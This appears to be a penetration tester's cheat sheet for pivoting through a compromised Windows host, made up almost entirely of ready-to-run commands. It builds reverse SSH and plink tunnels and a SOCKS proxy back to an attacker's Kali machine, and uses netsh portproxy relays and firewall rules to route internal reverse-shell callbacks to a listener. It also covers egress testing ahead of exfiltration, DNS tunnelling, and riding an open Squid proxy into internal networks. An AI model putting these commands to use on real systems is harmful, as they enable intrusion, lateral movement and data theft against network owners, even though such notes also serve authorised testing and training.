# Port forwarding on Windows

## Which one
- [ ] ssh.exe, built into Windows 10 1803 and Server 2019 on: reverse forwards and a reverse SOCKS proxy to Kali
- [ ] plink.exe, one upload: reverse forwards to Kali, with the password on the command line
- [ ] netsh portproxy, as a local administrator: a port on the pivot relayed to an internal host
- [ ] A whole network: :Pb ligolo or :Pb chisel
where.exe ssh
ssh -V

## Kali ready for the pivot to log in
A throwaway account, since the pivot sees its password:
sudo useradd -m -s /usr/sbin/nologin tunnel
sudo passwd tunnel
sudo systemctl start ssh

## The built-in ssh.exe
A SOCKS proxy on Kali's 1080 into the pivot's networks:
ssh -N -o StrictHostKeyChecking=no -R 1080 tunnel@<LHOST>
An internal service on a Kali port:
ssh -N -o StrictHostKeyChecking=no -R <LPORT>:<InternalIP>:<Port> tunnel@<LHOST>
- [ ] The password prompt needs a real console: from a plain reverse shell, plink instead
Kali's proxychains points at Tor's port; this makes it use the proxy instead:
sudo sed -i 's/^socks4.*9050$/socks5 127.0.0.1 1080/' /etc/proxychains4.conf

## plink
At the pwn-broker prompt:
tool install plink
serve
serve files plink
- [ ] plink.exe fetched on the pivot with the line serve files gives; plink32.exe on 32-bit Windows
On the pivot, an internal service on a Kali port. The echo answers the host key question:
cmd.exe /c echo y | .\plink.exe -ssh -l tunnel -pw THE-TUNNEL-PASSWORD -N -R 127.0.0.1:<LPORT>:<InternalIP>:<Port> <LHOST>
The pivot's own RDP:
cmd.exe /c echo y | .\plink.exe -ssh -l tunnel -pw THE-TUNNEL-PASSWORD -N -R 127.0.0.1:<LPORT>:127.0.0.1:3389 <LHOST>
On Kali:
xfreerdp3 /v:127.0.0.1:<LPORT> /u:'<Username>' /p:'<Password>' /cert:ignore

## netsh portproxy
As a local administrator, a port on the pivot relayed to an internal host, and the firewall opened for it:
netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=<PivotIP> connectport=<Port> connectaddress=<InternalIP>
netsh advfirewall firewall add rule name="pf-<LPORT>" protocol=TCP dir=in localip=<PivotIP> localport=<LPORT> action=allow
netsh interface portproxy show all
From Kali, against the pivot:
nc -nv <PivotIP> <LPORT>
- [ ] show all lists it and nothing listens: the IP Helper service is stopped
sc.exe query iphlpsvc

## Callbacks from the internal network
The pivot's port, on every interface, relayed to my listener:
netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<LPORT> connectaddress=<LHOST>
netsh advfirewall firewall add rule name="pf-<LPORT>" protocol=TCP dir=in localport=<LPORT> action=allow
rlwrap nc -lvnp <LPORT>
- [ ] The payload goes to the pivot's address on <Subnet>/<CIDR>, <PivotInternalIP>, on <LPORT>: :Pb shells
- [ ] The same firewall rule opens the port for a ligolo-ng or chisel listener on this pivot

## Afterwards
Port proxies and firewall rules survive a reboot, so both come out:
netsh interface portproxy del v4tov4 listenport=<LPORT> listenaddress=<PivotIP>
netsh interface portproxy del v4tov4 listenport=<LPORT> listenaddress=0.0.0.0
netsh advfirewall firewall delete rule name="pf-<LPORT>"
On Kali:
sudo systemctl stop ssh
sudo userdel -r tunnel

## Egress testing

Before exfil or a reverse shell, learn what the target can reach outbound.

- [ ] Stand up listeners on Kali on likely-open ports: nc -lvnp 443, plus 53, 80, 8080 in parallel
- [ ] From the target, curl http://<KaliIP>:443 and try each port; note which connect
- [ ] Check for proxy-only egress: env | grep -i proxy, WPAD/PAC files, netstat for a corporate proxy
- [ ] If only DNS leaves the network, tunnel with iodine or dnscat2 as a last resort — it is slow

## Through an open proxy (Squid)

An open Squid on 3128 is a free ride to the internal network.

- [ ] Point proxychains at it: http <SquidIP> 3128
- [ ] Internal-only tools and ports are now reachable through the proxy
- [ ] Read the config for a network map: squid -k parse or squid.conf leaks ACLs and internal ranges
